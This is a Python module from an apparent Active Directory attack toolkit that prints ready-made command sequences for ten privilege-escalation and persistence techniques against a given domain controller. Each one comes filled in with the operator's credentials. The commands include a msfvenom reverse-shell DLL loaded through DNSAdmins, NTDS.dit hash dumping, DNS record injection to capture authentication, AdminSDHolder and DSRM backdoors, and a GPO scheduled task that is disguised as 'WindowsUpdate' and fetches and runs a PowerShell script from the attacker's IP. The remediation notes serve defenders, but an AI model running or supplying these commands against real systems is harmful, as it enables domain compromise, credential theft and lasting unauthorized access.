"""
Module: AD Miscellaneous Abuse
Techniques: DNSAdmins DLL, Backup Operators NTDS, ADIDNS Wildcard,
            Force Set SPN, User Hunting, Exchange PrivExchange,
            Powermad MAQ, AdminSDHolder, DSRM, GPO Abuse
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("AD MISCELLANEOUS ABUSE", "DNSAdmins / Backup Operators / ADIDNS / Exchange")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    base_dn = "DC=" + dom.replace(".", ",DC=")

    print(f"""
  [1]  DNSAdmins → SYSTEM         (DLL injection via dnscmd)
  [2]  Backup Operators → NTDS    (SeBackupPrivilege abuse)
  [3]  ADIDNS Abuse               (wildcard / WPAD record injection)
  [4]  Force Set SPN              (Targeted Kerberoasting)
  [5]  User Hunting               (Invoke-UserHunter / CME loggedon)
  [6]  Exchange PrivExchange      (relay Exchange SYSTEM auth)
  [7]  Powermad                   (Machine Account Quota abuse)
  [8]  AdminSDHolder Backdoor     (ACL propagation via SDProp)
  [9]  DSRM Backdoor              (local DC admin → network auth)
  [10] Group Policy Abuse         (deploy payload via GPO write)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ─────────────────────────────────────────────────────────────────────────
    if c == "1":
        attacker = prompt("Attacker IP (hosting DLL share)")
        dll_name = prompt("DLL filename (e.g. evil.dll)")
        print(f"""
  {C}DNSAdmins DLL Injection — SYSTEM on DC:{RST}

  {Y}Step 1 — Create malicious DLL:{RST}
  msfvenom -p windows/x64/shell_reverse_tcp \\
    LHOST={attacker} LPORT=4444 -f dll -o {dll_name}

  {Y}Step 2 — Host on SMB share (attacker machine):{RST}
  impacket-smbserver SHARE $(pwd) -smb2support \\
    -username {user} -password '{pw}'

  {Y}Step 3 — Register DLL via dnscmd (needs DNSAdmins):{RST}
  dnscmd {dc} /config /serverlevelplugindll \\\\{attacker}\\SHARE\\{dll_name}

  {Y}Step 4 — Restart DNS to trigger execution:{RST}
  sc.exe \\\\{dc} stop dns
  sc.exe \\\\{dc} start dns

  {Y}Via CrackMapExec (one-liner):{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' \\
    -x "dnscmd /config /serverlevelplugindll \\\\{attacker}\\SHARE\\{dll_name} && sc stop dns && sc start dns"

  {Y}Step 5 — CLEANUP (mandatory after engagement):{RST}
  dnscmd {dc} /config /serverlevelplugindll ""
  sc.exe \\\\{dc} stop dns && sc.exe \\\\{dc} start dns
""")
        add_finding("DNSAdmins DLL Injection", "Critical",
                    f"DNSAdmins membership abused → malicious DLL loaded on {dc} → SYSTEM",
                    "Remove unnecessary users from DNSAdmins; monitor dns.exe plugin config changes; enable DNS debug logging")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "2":
        print(f"""
  {C}Backup Operators → NTDS Dump (SeBackupPrivilege):{RST}

  {Y}Step 1 — Verify group membership + privilege:{RST}
  net user {user} /domain | findstr /i backup
  whoami /priv | findstr SeBackupPrivilege

  {Y}Step 2A — Diskshadow + robocopy (most reliable):{RST}
  # Create file: C:\\diskshadow.txt with content:
  #   set context persistent nowriters
  #   add volume c: alias mydrive
  #   create
  #   expose %mydrive% z:
  diskshadow /s C:\\diskshadow.txt
  robocopy /b z:\\Windows\\NTDS C:\\temp ntds.dit
  reg save HKLM\\SYSTEM C:\\temp\\SYSTEM

  {Y}Step 2B — BackupOperatorToolkit (remote):{RST}
  .\\BackupOperatorToolkit.exe DUMP {dc} .\\ntds.dit .\\SYSTEM

  {Y}Step 2C — SeBackupAbuse PoC:{RST}
  .\\SeBackupAbuse.exe

  {Y}Step 3 — Extract hashes (Linux):{RST}
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -just-dc-ntlm

  {Y}Remote alternative (CME):{RST}
  crackmapexec smb {dc} -u '{user}' -p '{pw}' --ntds
""")
        add_finding("Backup Operators → NTDS Dump", "Critical",
                    f"{user} used SeBackupPrivilege to dump NTDS.dit",
                    "Audit Backup Operators membership; restrict SeBackupPrivilege; monitor diskshadow/wbadmin usage")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "3":
        attacker = prompt("Attacker IP (where auth should be sent)")
        record   = prompt("DNS record to inject [wpad/* for wildcard]") or "wpad"
        print(f"""
  {C}ADIDNS Abuse — inject DNS record to capture domain auth:{RST}

  {Y}Step 1 — Check if ADIDNS zone allows authenticated user writes:{RST}
  # Powermad
  Import-Module .\\Powermad.ps1
  Invoke-ADIDNSCheck -Verbose

  {Y}Step 2 — Inject record (Powermad — Windows):{RST}
  Import-Module .\\Powermad.ps1
  New-ADIDNSNode -Node "{record}" -Data {attacker} -Tombstone

  {Y}Step 2 — Inject record (dnstool.py — Linux):{RST}
  python3 dnstool.py -u '{dom}\\{user}' -p '{pw}' \\
    -a add -r "{record}" -d {attacker} {dc}

  {Y}Wildcard record (capture ALL unresolved hostnames):{RST}
  python3 dnstool.py -u '{dom}\\{user}' -p '{pw}' \\
    -a add -r "*" -d {attacker} {dc}

  {Y}Step 3 — Capture hashes with Responder or relay:{RST}
  sudo responder -I <interface> -rdwv --no-mdns
  # or
  impacket-ntlmrelayx -tf targets.txt -smb2support

  {Y}Step 4 — Cleanup:{RST}
  python3 dnstool.py -u '{dom}\\{user}' -p '{pw}' \\
    -a remove -r "{record}" {dc}
""")
        add_finding("ADIDNS Wildcard / WPAD Record Injection", "High",
                    f"DNS record '{record}' → {attacker} injected into AD-integrated DNS zone",
                    "Restrict ADIDNS zone write permissions; block WPAD via DNS; enable DNS audit logging")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "4":
        target_user = prompt("Target user account (to inject SPN)")
        spn_value   = prompt("Fake SPN (e.g. FAKE/server.corp.local)") or f"FAKE/{dc}"
        print(f"""
  {C}Force Set SPN — Targeted Kerberoasting:{RST}

  {Y}Requirement: GenericWrite or GenericAll on target user{RST}

  {Y}Step 1 — Set SPN (PowerView):{RST}
  Set-DomainObject -Identity '{target_user}' \\
    -Set @{{serviceprincipalname='{spn_value}'}} -Verbose

  {Y}Step 1 — Set SPN (setspn.exe):{RST}
  setspn -s {spn_value} {dom}\\{target_user}

  {Y}Step 1 — Set SPN (ldapmodify — Linux):{RST}
  ldapmodify -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' <<EOF
  dn: CN={target_user},CN=Users,{base_dn}
  changetype: modify
  add: servicePrincipalName
  servicePrincipalName: {spn_value}
  EOF

  {Y}Step 2 — Kerberoast the target:{RST}
  impacket-GetUserSPNs {dom}/{user}:'{pw}' -dc-ip {dc} \\
    -request -outputfile /tmp/targeted_roast.txt

  {Y}Step 3 — Crack:{RST}
  hashcat -m 13100 /tmp/targeted_roast.txt /usr/share/wordlists/rockyou.txt

  {Y}Step 4 — Cleanup (remove fake SPN):{RST}
  Set-DomainObject -Identity '{target_user}' \\
    -Clear serviceprincipalname -Verbose
""")
        add_finding("Force Set SPN — Targeted Kerberoasting", "High",
                    f"Fake SPN injected on {target_user} to enable targeted Kerberoasting",
                    "Monitor servicePrincipalName attribute changes (Event ID 5136); restrict GenericWrite ACLs")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "5":
        target_user = prompt("Privileged user to hunt (e.g. administrator)") or "administrator"
        print(f"""
  {C}User Hunting — find where privileged accounts are active:{RST}

  {Y}PowerView — Invoke-UserHunter:{RST}
  # Find all machines where DA group members are logged on
  Invoke-UserHunter -Verbose

  # Hunt specific user
  Invoke-UserHunter -UserName {target_user} -Verbose

  # Only machines where YOU are local admin (more op-sec)
  Invoke-UserHunter -CheckAccess -Verbose

  # Stealth mode (only checks DC + high-value servers)
  Invoke-UserHunter -Stealth -Verbose

  # Hunt entire group
  Invoke-UserHunter -GroupName "Domain Admins" -Verbose

  {Y}CrackMapExec — logged on users:{RST}
  crackmapexec smb <subnet>/24 -u '{user}' -p '{pw}' -d {dom} --loggedon-users
  crackmapexec smb <subnet>/24 -u '{user}' -p '{pw}' -d {dom} --sessions

  {Y}BloodHound — session collection (loop every 5 min):{RST}
  .\\SharpHound.exe -c Session,LoggedOn \\
    --loop --loopinterval 00:05:00 --loopduration 01:00:00

  {Y}Impacket netview:{RST}
  impacket-netview {dom}/{user}:'{pw}' -target {dc}
""")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "6":
        exchange = prompt("Exchange Server IP/FQDN")
        attacker = prompt("Attacker IP")
        print(f"""
  {C}PrivExchange — Exchange SYSTEM auth → DCSync rights:{RST}

  {Y}Step 1 — Start ntlmrelayx targeting LDAP (escalate-user):{RST}
  impacket-ntlmrelayx -t ldap://{dc} -smb2support \\
    --escalate-user '{user}' --no-smb-server

  {Y}Step 2 — Trigger Exchange to push auth to attacker:{RST}
  python3 privexchange.py -ah {attacker} {exchange} \\
    -u '{user}' -p '{pw}' -d {dom}

  {Y}Step 3 — DCSync with newly granted rights:{RST}
  impacket-secretsdump {dom}/{user}:'{pw}'@{dc} -just-dc-ntlm

  {Y}Step 4 — Enumerate Exchange security groups:{RST}
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b '{base_dn}' '(objectClass=group)' cn | grep -i exchange
""")
        add_finding("PrivExchange Relay", "Critical",
                    f"Exchange {exchange} relayed SYSTEM auth → DCSync rights granted to {user}",
                    "Apply Exchange security updates; restrict Exchange ACLs on domain object; enforce EPA on EWS")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "7":
        comp_name = prompt("New computer name (without $)") or "EVIL"
        comp_pass = prompt("Computer password") or "P@ss123!"
        print(f"""
  {C}Powermad — Machine Account Quota (MAQ) Abuse:{RST}

  {Y}Step 1 — Check MachineAccountQuota (default=10):{RST}
  # ldapsearch (Linux)
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b '{base_dn}' '(objectClass=domain)' ms-ds-machineaccountquota

  # PowerView
  Get-DomainObject -Identity '{dom}' | select ms-ds-machineaccountquota

  {Y}Step 2 — Add computer account:{RST}
  # Powermad (Windows)
  Import-Module .\\Powermad.ps1
  New-MachineAccount -MachineAccount {comp_name} \\
    -Password $(ConvertTo-SecureString '{comp_pass}' -AsPlainText -Force)

  # impacket (Linux)
  impacket-addcomputer {dom}/{user}:'{pw}' \\
    -computer-name '{comp_name}$' -computer-pass '{comp_pass}' -dc-ip {dc}

  {Y}Step 3 — Abuse via RBCD:{RST}
  impacket-rbcd -f {comp_name} -t <TARGET_COMPUTER> \\
    {dom}/{user}:'{pw}' -dc-ip {dc} -action write

  impacket-getST -spn cifs/<TARGET>.{dom} \\
    -impersonate Administrator \\
    {dom}/{comp_name}$:'{comp_pass}' -dc-ip {dc}

  export KRB5CCNAME=Administrator@cifs_<TARGET>.ccache
  impacket-psexec {dom}/Administrator@<TARGET> -k -no-pass
""")
        add_finding("Powermad MAQ Abuse", "High",
                    f"Computer account '{comp_name}$' created via MAQ for RBCD/Kerberos attacks",
                    "Set ms-ds-MachineAccountQuota=0; restrict computer account creation; monitor AD computer object creation")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "8":
        backdoor = prompt("Controlled user to add to AdminSDHolder ACL")
        print(f"""
  {C}AdminSDHolder Backdoor — persistent DA-level access via ACL propagation:{RST}

  {Y}How SDProp works:{RST}
  SDProp runs every 60 min on PDC Emulator.
  It copies ACLs from AdminSDHolder to ALL protected objects:
  Domain Admins, Enterprise Admins, Schema Admins, Administrators,
  Account Operators, Backup Operators, Print Operators, Server Operators

  {Y}Step 1 — Grant GenericAll on AdminSDHolder:{RST}
  # Impacket dacledit (Linux)
  impacket-dacledit -action write -rights FullControl \\
    -principal '{backdoor}' \\
    -target-dn 'CN=AdminSDHolder,CN=System,{base_dn}' \\
    {dom}/{user}:'{pw}' -dc-ip {dc}

  # PowerView (Windows)
  Add-DomainObjectAcl \\
    -TargetIdentity 'CN=AdminSDHolder,CN=System,{base_dn}' \\
    -PrincipalIdentity '{backdoor}' -Rights All -Verbose

  {Y}Step 2 — Force immediate SDProp execution:{RST}
  Invoke-ADSDPropagation   # PowerView

  {Y}Step 3 — Verify ACL propagated to Domain Admins group:{RST}
  Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | \\
    Where-Object {{$_.SecurityIdentifier -match \\
      (Get-DomainUser {backdoor}).objectsid}}

  {Y}Step 4 — Reset any DA password (now you have the right):{RST}
  Set-DomainUserPassword -Identity 'Administrator' \\
    -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)
""")
        add_finding("AdminSDHolder ACL Backdoor", "Critical",
                    f"GenericAll added for '{backdoor}' on AdminSDHolder — propagates to all protected groups every 60 min",
                    "Audit AdminSDHolder ACLs regularly; monitor Event ID 4670; alert on ACE additions to CN=AdminSDHolder")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "9":
        print(f"""
  {C}DSRM Backdoor — local DC admin hash for persistent network auth:{RST}

  {Y}What is DSRM?{RST}
  Directory Services Restore Mode — every DC has a local admin account.
  Default: blocked for network logon.
  Attack: change one registry value → DSRM hash usable remotely.

  {Y}Step 1 — Dump DSRM hash from DC (DA required):{RST}
  # Mimikatz on DC:
  Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' \\
    -ComputerName {dc}

  # Or impacket:
  impacket-secretsdump {dom}/{user}:'{pw}'@{dc} -sam

  {Y}Step 2 — Enable network logon with DSRM hash (run on DC as DA):{RST}
  New-ItemProperty \\
    "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" \\
    -Name "DsrmAdminLogonBehavior" \\
    -Value 2 -PropertyType DWORD -Force

  {Y}Step 3 — Use DSRM hash anytime (survives DA password resets!):{RST}
  impacket-secretsdump '{dom}/Administrator@{dc}' -hashes :<dsrm_hash> -just-dc-ntlm
  impacket-psexec '{dom}/Administrator@{dc}' -hashes :<dsrm_hash>
  evil-winrm -i {dc} -u Administrator -H <dsrm_hash>
""")
        add_finding("DSRM Backdoor", "Critical",
                    f"DsrmAdminLogonBehavior=2 set on {dc} — DSRM hash usable for network auth indefinitely",
                    "Set DsrmAdminLogonBehavior=0 on all DCs; rotate DSRM password quarterly; monitor registry changes on DCs")

    # ─────────────────────────────────────────────────────────────────────────
    elif c == "10":
        gpo_name = prompt("Target GPO name (needs write access)")
        attacker = prompt("Attacker IP (payload callback)")
        print(f"""
  {C}Group Policy Abuse — deploy payload via GPO write rights:{RST}

  {Y}Step 1 — Identify GPOs you can write to:{RST}
  # PowerView
  Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | \\
    Where-Object {{$_.ActiveDirectoryRights -match "Write" -and \\
      $_.SecurityIdentifier -eq \\
        (Get-DomainUser {user}).objectsid}}

  # BloodHound query:
  # MATCH p=(u:User {{name:"{user.upper()}@{dom.upper()}"}})-[:GenericWrite|GenericAll]->(g:GPO) RETURN p

  {Y}Step 2 — SharpGPOAbuse — scheduled task (executes as SYSTEM):{RST}
  .\\SharpGPOAbuse.exe --AddComputerTask \\
    --TaskName "WindowsUpdate" \\
    --Author "NT AUTHORITY\\SYSTEM" \\
    --Command "powershell.exe" \\
    --Arguments "-nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://{attacker}/s.ps1'))" \\
    --GPOName "{gpo_name}"

  {Y}Step 2 (alt) — Add local admin:{RST}
  .\\SharpGPOAbuse.exe --AddLocalAdmin \\
    --UserAccount {user} --GPOName "{gpo_name}"

  {Y}Step 2 (alt) — Startup script:{RST}
  .\\SharpGPOAbuse.exe --AddComputerScript \\
    --ScriptName update.bat \\
    --ScriptContents "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://{attacker}/s.ps1'))" \\
    --GPOName "{gpo_name}"

  {Y}Step 3 — Force GPO refresh on targets:{RST}
  Invoke-GPUpdate -Computer <target> -RandomDelayInMinutes 0 -Force
  crackmapexec smb <target> -u '{user}' -p '{pw}' -x "gpupdate /force"
""")
        add_finding("GPO Abuse — Payload Deployment", "Critical",
                    f"GPO '{gpo_name}' modified to deploy scheduled task payload",
                    "Audit GPO write permissions; restrict GPO modifications; monitor Event ID 5136 for GPO changes; use AGPM")

    pause()
